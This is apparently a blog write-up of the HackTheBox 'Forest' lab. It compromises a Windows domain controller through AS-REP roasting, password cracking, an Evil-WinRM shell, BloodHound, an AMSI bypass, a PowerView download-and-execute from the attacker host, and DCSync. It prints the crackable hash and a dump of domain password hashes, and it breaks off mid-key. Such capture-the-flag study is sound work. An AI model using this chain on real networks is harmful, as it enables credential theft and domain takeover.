"Alfresco, Active Directory, Domain Controller, AS-REP Roasting, DCSync, rpcclient, ldapsearch, Anonymous LDAP binds, crackmapexec, Kerberos, kerbrute, Bloodhound, bloodhound-python, SharpHound, impacket, impacket-secretsdump, GetNPUsers.py, John The Ripper, Evil-WinRM, PowerView, smbserver.py, secretsdump.py, Bypass-4MSI, Pass The Hash, psexec.py, Golden Ticket, krbtgt, ntpdate, ticketer.py, htb-windows-easy, writeup, oscp-prep", "date": "2021-09-07 00:47:54 +0700", "snippet": "Forest in an easy HackTheBox virtual machine acting as a Windows Domain Controller (DC) in which Exchange Server has been installed.Anonymous LDAP binds are allowed, which we will use to enumerate domain objects. We will also take advantage of null authentication enabled with rpcclient to enumerate usernames.It turns out that a specific service (Alfresco) that do not require Kerberos preauthentication is installed, which leads us to discover an as-rep roastable account. We will dump its password hash and crack it with john to gain a foothold.The compromised service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange Windows Permissions group.Finally, the Exchange group membership is leveraged to gain DCSync privileges on the domain and dump all password hashes.Enumerationnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Forest-full-port-scan.txt 10.10.10.161Warning: 10.10.10.161 giving up on port because retransmission cap hit (1).Nmap scan report for 10.10.10.161Host is up (0.097s latency).Not shown: 61414 closed ports, 4098 filtered portsPORT STATE SERVICE VERSION53/tcp open domain?88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-08-15 18:58:09Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49671/tcp open msrpc Microsoft Windows RPC49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049677/tcp open msrpc Microsoft Windows RPC49684/tcp open msrpc Microsoft Windows RPC49703/tcp open msrpc Microsoft Windows RPCService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h30m07s, deviation: 4h02m30s, median: 10m06s| smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)| Computer name: FOREST| NetBIOS computer name: FOREST\\x00| Domain name: htb.local| Forest name: htb.local| FQDN: FOREST.htb.local|_ System time: 2021-08-15T12:00:29-07:00| smb-security-mode: | account_used: &amp;lt;blank&amp;gt;| authentication_level: user| challenge_response: supported|_ message_signing: required| smb2-security-mode: | 2.02: |_ Message signing enabled and required| smb2-time: | date: 2021-08-15T19:00:31|_ start_date: 2021-08-15T18:54:53The port 53 (DNS) is open which certainly means that we’re facing an Active Directory.SMB (port 139 &amp;amp; 445)According to smbclient, we couldn’t find accessible shares:$ smbclient -L \\\\$TARGETEnter WORKGROUP\\root&#39;s password: Anonymous login successful Sharename Type Comment --------- ---- -------SMB1 disabled -- no workgroup availableWith crackmapexec using a null authentication, we can look at the password policy:$ crackmapexec smb $TARGET --pass-pol -u &#39;&#39; -p &#39;&#39; The Account Lockout Threshold is set to None so we could perform a password spraying attack.Port 389 (LDAP)$ ldapsearch -h 10.10.10.161 -x -s base namingcontexts | tee services/ldap_search_namingcontexts.txt# extended LDIF## LDAPv3# base &amp;lt;&amp;gt; (default) with scope baseObject# filter: (objectclass=*)# requesting: namingcontexts ##dn:namingContexts: DC=htb,DC=localnamingContexts: CN=Configuration,DC=htb,DC=localnamingContexts: CN=Schema,CN=Configuration,DC=htb,DC=localnamingContexts: DC=DomainDnsZones,DC=htb,DC=localnamingContexts: DC=ForestDnsZones,DC=htb,DC=local# search resultsearch: 2result: 0 Success# numResponses: 2# numEntries: 1$ echo &quot;$TARGET htb.local&quot; &amp;gt;&amp;gt; /etc/hosts # adding domain controller to hosts$ ldapsearch -h $TARGET -x -b &quot;DC=htb,DC=local&quot; &amp;gt; services/anon_ldap.txt Note: the tool windapsearch could also be used to query the domain further.Port 135 (RPC)$ rpcclient -U &#39;%&#39; 10.10.10.161rpcclient $&amp;gt; srvinfoCould not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIEDrpcclient $&amp;gt; enumdomusers # display a list of users names defined on the serveruser:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[DefaultAccount] rid:[0x1f7]user:[$331000-VK4ADACQNUCA] rid:[0x463]user:[SM_2c8eef0a09b545acb] rid:[0x464]user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]user:[SM_75a538d3025e4db9a] rid:[0x466]user:[SM_681f53d4942840e18] rid:[0x467]user:[SM_1b41c9286325456bb] rid:[0x468]user:[SM_9b69f1b9d2cc45549] rid:[0x469]user:[SM_7c96b981967141ebb] rid:[0x46a]user:[SM_c75ee099d0a64c91b] rid:[0x46b]user:[SM_1ffab36a2f5f479cb] rid:[0x46c]user:[HealthMailboxc3d7722] rid:[0x46e]user:[HealthMailboxfc9daad] rid:[0x46f]user:[HealthMailboxc0a90c9] rid:[0x470]user:[HealthMailbox670628e] rid:[0x471]user:[HealthMailbox968e74d] rid:[0x472]user:[HealthMailbox6ded678] rid:[0x473]user:[HealthMailbox83d6781] rid:[0x474]user:[HealthMailboxfd87238] rid:[0x475]user:[HealthMailboxb01ac64] rid:[0x476]user:[HealthMailbox7108a4e] rid:[0x477]user:[HealthMailbox0659cc1] rid:[0x478]user:[sebastien] rid:[0x479]user:[lucinda] rid:[0x47a]user:[svc-alfresco] rid:[0x47b]user:[andy] rid:[0x47e]user:[mark] rid:[0x47f]user:[santi] rid:[0x480]rpcclient $&amp;gt; getdompwinfo # get SMB password policymin_password_length: 7password_properties: 0x00000000rpcclient $&amp;gt; querydispinfo # get users infoindex: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA Name: (null) Desc: (null)index: 0xfbc RID: 0x1f4 acb: 0x00020010 Account: Administrator Name: Administrator Desc: Built-in account for administering the computer/domainindex: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy Name: Andy Hislip Desc: (null)index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null) Desc: A user account managed by the system.index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest Name: (null) Desc: Built-in account for guest access to the computer/domainindex: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1 Name: HealthMailbox-EXCH01-010 Desc: (null)index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e Name: HealthMailbox-EXCH01-003 Desc: (null)index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678 Name: HealthMailbox-EXCH01-005 Desc: (null)index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e Name: HealthMailbox-EXCH01-009 Desc: (null)index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781 Name: HealthMailbox-EXCH01-006 Desc: (null)index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d Name: HealthMailbox-EXCH01-004 Desc: (null)index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64 Name: HealthMailbox-EXCH01-008 Desc: (null)index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9 Name: HealthMailbox-EXCH01-002 Desc: (null)index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722 Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013 Desc: (null)index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad Name: HealthMailbox-EXCH01-001 Desc: (null)index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238 Name: HealthMailbox-EXCH01-007 Desc: (null)index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null) Desc: Key Distribution Center Service Accountindex: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda Name: Lucinda Berger Desc: (null)index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark Name: Mark Brandt Desc: (null)index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi Name: Santi Rodriguez Desc: (null)index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien Name: Sebastien Caron Desc: (null)index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb Name: Microsoft Exchange Migration Desc: (null)index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9} Desc: (null)index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb Name: Microsoft Exchange Approval Assistant Desc: (null)index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18 Name: Discovery Search Mailbox Desc: (null)index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a Name: Microsoft Exchange Desc: (null)index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb Name: E4E Encryption Store - Active Desc: (null)index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549 Name: Microsoft Exchange Federation Mailbox Desc: (null)index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b Name: Microsoft Exchange Desc: (null)index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b Name: Microsoft Exchange Desc: (null)index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco Name: svc-alfresco Desc: (null)rpcclient $&amp;gt;Using rpclient, we’ve been able to enumerate a list of usernames and what seems to be a service name: andy (Andy Hislip) lucinda (Lucinda Berger) mark (Mark Brandt) santi (Santi Rodriguez) sebastien (Sebastien Caron) svc-alfresco Note: enum4linux could also be used to enumerate usernames and password policy.Kerberos (port 88)We can confirm that usernames discovered earlier exist using kerbrute:./kerbrute userenum --dc htb.local -d htb.local User.txtLooking at alfresco documentation, we can see that it requires Kerberos pre-authentication to be disabled.This will allow us to perform AS-REP Roasting: sending a dummy request to the Key Distribution Center (KDC) getting a TGT (Ticket Granting Ticket) which contains material encrypted with the user’s password hash trying to crack the password with an offline bruteforce attack Unlike Kerberoasting these users do not necessary have to be service accounts.FootholdAS-REP Roasting with GetNPUsers.py (impacket)GetNPUsers.py from impacket can be used to request a TGT (Ticket Granting Ticket), getting both the vulnerable usernames and their corresponding krbasrep5 hashes directly:$ GetNPUsers.py htb.local/ -dc-ip $TARGET -request # we could add &#39;-format hashcat&#39;Impacket v0.9.22 - Copyright 2020 SecureAuth CorporationName MemberOf PasswordLastSet LastLogon UAC ------------ ------------------------------------------------------ -------------------------- -------------------------- --------svc-alfresco CN=Service Accounts,OU=Security Groups,DC=htb,DC=local 2021-08-17 22:07:11.322568 2021-08-17 21:52:25.008334 0x410200 $krb5asrep$23$svc-alfresco@HTB.LOCAL:1ab93db0067516ce979a1a21bfad456a$89bf43129d73d2b85bb939d9dc5f11533e80b53b6c86f5fe0d86ddf531fc380b77abbdbc4ebc77bc2f1ad94dc49a308c5f8aa74d885386ffbefdb25d4f201798c0acaf383ce79ed4afaf921994f37d06a2be1515cd28d78d13f8bb3219776071f373107c1605646cd11bbe65f87476c41ae90e4fd098188f680382626603c234dfd8f6432b9d5f31f86aba0ac025ca6ec77cf9434cbfb33a92d5e99295e457351e3d0947a7ea59f53f7d31be8957bbb34930aac943c55a09020970677c62f9283c57045e5ca1cc7e5730651cea7e46a257e44771abfde9fc179f635b5d5c65c08612e420c703Crack the clear text password of the service account with john$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])Will run 12 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statuss3rvice ($krb5asrep$23$svc-alfresco@HTB.LOCAL)1g 0:00:00:01 DONE (2021-08-17 22:29) 0.6622g/s 2705Kp/s 2705Kc/s 2705KC/s s64891817..s3r2s1Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completeds3rvice is svc-alfresco’s password.Shell over WinRMPort 5985 is open so maybe we can login remotely over WinRM with these credentials.$ evil-winrm -i $TARGET -u svc-alfresco -p s3rvicePrivilege escalationLocal enumeration with winPEASIn order to transfer winPEAS.exe we can host an SMB server on our machine using impacket again:$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop&amp;gt; copy \\\\10.10.14.12\\kali\\winPEASx64.exe .*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop&amp;gt; dir Directory: C:\\Users\\svc-alfresco\\DesktopMode LastWriteTime Length Name---- ------------- ------ -----ar--- 9/23/2019 2:16 PM 32 user.txt-a---- 8/17/2021 3:36 PM 1920000 winPEASx64.exeAt this point, I didn’t find anything exploitable from winPEAS output.Exploring exploitable paths with BloodHoundAs it is a Domain Controller, we can also use BloodHound to visualize the domain and see if there are potential privilege escalation paths.Method #1: using SharpHound On our attacker machine, we have to download SharpHound.exe: $ wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe Then we can transfer it the same way we did for winPEAS (using impacket smbserver.py) After executing it we’ll have a zip file that we can transfer once again with our SMB server and then upload it to the BloodHound web app: *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&amp;gt; .\\SharpHound.exe ---------------------------------------------- Initializing SharpHound at 5:34 AM on 9/6/2021 ---------------------------------------------- Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container [+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=htb,DC=local [+] Cache File not Found: 0 Objects in cache [+] Pre-populating Domain Controller SIDS Status: 0 objects finished (+0) -- Using 21 MB RAM Status: 123 objects finished (+123 61.5)/s -- Using 28 MB RAM Enumeration finished in 00:00:02.3907594 Compressing data to .\\20210906053417_BloodHound.zip You can upload this file directly to the UI SharpHound Enumeration Completed at 5:34 AM on 9/6/2021! Happy Graphing! *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&amp;gt; copy .\\20210906053417_BloodHound.zip \\\\10.10.14.12\\kali\\20210906053417_BloodHound.zip Another way to transfer the zip file is to encode it in base64 using certutil -encode 20210906053417_BloodHound.zip loot.txt In order to run BloodHound on our attacker machine, we have to run these commands: # Open a terminal and type the following:$ neo4j console # default credentials -&amp;gt; neo4j:neo4j# In another terminal, open bloodhound:$ bloodhoundMethod #2: using bloodhound-python$ pip install bloodhound $ bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -c all -ns $TARGETINFO: Found AD domain: htb.localINFO: Connecting to LDAP server: FOREST.htb.localINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 2 computersINFO: Connecting to LDAP server: FOREST.htb.localWARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153INFO: Found 31 usersINFO: Found 75 groupsINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: EXCH01.htb.localINFO: Querying computer: FOREST.htb.localINFO: Done in 00M 40S$ ls *.json20210906143955_computers.json 20210906143955_domains.json 20210906143955_groups.json 20210906143955_users.jsonThis is the easiest way! These JSON files can be directly uploaded to the BloodHound GUI.Finding an AD Attack Path First, we have to mark svc-alfresco as owned: Then, we can click on Shortest Path from Owned Principals: As we can see on the screenshot above, svc-alfresco is a member of Service Accounts which is a member of Privileged IT Accounts which is a member of the very special group Account Operators.Members of this group are allowed create and modify users and add them to non-protected groups. [Read Microsoft documentation]Now if we click on Shortest Paths to High Value Targets, Bloodhound will reveal another graph: The Account Operators group has GenericAll permissions on the Exchange Windows Permissions group. The Exchange Windows Permissions group has WriteDacl privileges on the Domain. The WriteDACL privilege gives a user the ability to add DACLs ( Discretionary Access Control List) to an object. This means that: We can add users to the Exchange Windows Permissions group (thanks to the GenericAll permission) Then, since the Exchange group has WriteDacl permission, we can give DCSync privileges to the users we created. The DCSync privilege will give us the right to perform a domain synchronization and finally dump all the password hashes!DCSYNC Add a user to the domain: *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&amp;gt; net user amirr0r password1234 /add /domain The command completed successfully. Add this user to the Excange Windows Permissions group: *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&amp;gt; net group &quot;Exchange Windows Permissions&quot; /add amirr0r The command completed successfully. Grant this user the DCSync privileges using PowerView.ps1: These information can be found via Help &amp;gt; Abuse info by right-clicking on WriteDacl in BloodHound *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&amp;gt; menu ... [+] Bypass-4MSI ... # we can disable Defender before importing the script *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&amp;gt; Bypass-4MSI [+] Patched! :D *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&amp;gt; IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.12/PowerView.ps1&#39;) *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&amp;gt; $SecPassword = ConvertTo-SecureString &#39;password1234&#39; -AsPlainText -Force *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&amp;gt; $Cred = New-Object System.Management.Automation.PSCredential(&#39;HTB\\amirr0r&#39;, $SecPassword) *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&amp;gt; Add-ObjectAcl -Credential $cred -TargetIdentity &quot;DC=htb,DC=local&quot; -PrincipalIdentity amirr0r -Rights DCSync Finally, perform a DCSync and extract all the password hashes of all the users on the domain with impacket secretsdump.py: $ /usr/share/doc/python3-impacket/examples/secretsdump.py htb.local/amirr0r:password1234@10.10.10.161Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretshtb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb.local\\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb.local\\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb.local\\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb.local\\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb.local\\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb.local\\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb.local\\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb.local\\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb.local\\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb.local\\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb.local\\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::htb.local\\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::htb.local\\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::htb.local\\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::htb.local\\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::htb.local\\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::htb.local\\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::htb.local\\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::htb.local\\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::htb.local\\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::htb.local\\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::htb.local\\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::htb.local\\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::htb.local\\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::htb.local\\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::htb.local\\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::htb.local\\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::amirr0r:9601:aad3b435b51404eeaad3b435b51404ee:d4a1be1776ad10df103812b1a923cde4:::FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:6f74ea9371b1049376b6280c8e0f0731:::EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::[*] Kerberos keys grabbedhtb.local\\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913htb.local\\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375htb.local\\Administrator:des-cbc-md5:c1e049c71f57343bkrbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528bkrbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58krbtgt:des-cbc-md5:9dd5647a31518ca8htb.local\\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4htb.local\\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864ehtb.local\\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43ehtb.local\\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bfhtb.local\\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bddhtb.local\\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236ehtb.local\\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225ehtb.local\\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43edhtb.local\\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983htb.local\\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91htb.local\\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53fhtb.local\\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01ahtb.local\\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23chtb.local\\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8htb.local\\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5dhtb.local\\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81htb.local\\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6htb.local\\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5htb.local\\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88ahtb.local\\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2htb.local\\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29htb.local\\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7htb.local\\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538htb.local\\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702htb.local\\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352htb.local\\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074dhtb.local\\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701htb.local\\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bdhtb.local\\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36htb.local\\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefbhtb.local\\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40chtb.local\\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3htb.local\\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054htb.local\\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161htb.local\\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943ahtb.local\\sebastien:des-cbc-md5:702a3445e0d65b58htb.local\\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5htb.local\\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fadhtb.local\\lucinda:des-cbc-md5:a13bb56bd043a2cehtb.local\\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32htb.local\\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2eahtb.local\\svc-alfresco:des-cbc-md5:014ac86d0b98294ahtb.local\\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94fhtb.local\\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6htb.local\\andy:des-cbc-md5:a2ab5eef017fb9dahtb.local\\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6htb.local\\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81htb.local\\mark:des-cbc-md5:b5dff1f40b8f3be9htb.local\\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427htb.local\\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25htb.local\\santi:des-cbc-md5:4075ad528ab9e5fdamirr0r:aes256-cts-hmac-sha1-96:1bcb06ac63d36244df3f5e5caf71124272fb4f3a39a92f7388e0dae5c6a1e994amirr0r:aes128-cts-hmac-sha1-96:4579d5cfdce40a61edd38e611ecb54a4amirr0r:des-cbc-md5:942f64df5b4f68c4FOREST$:aes256-cts-hmac-sha1-96:436bb9ae0cf5796398fa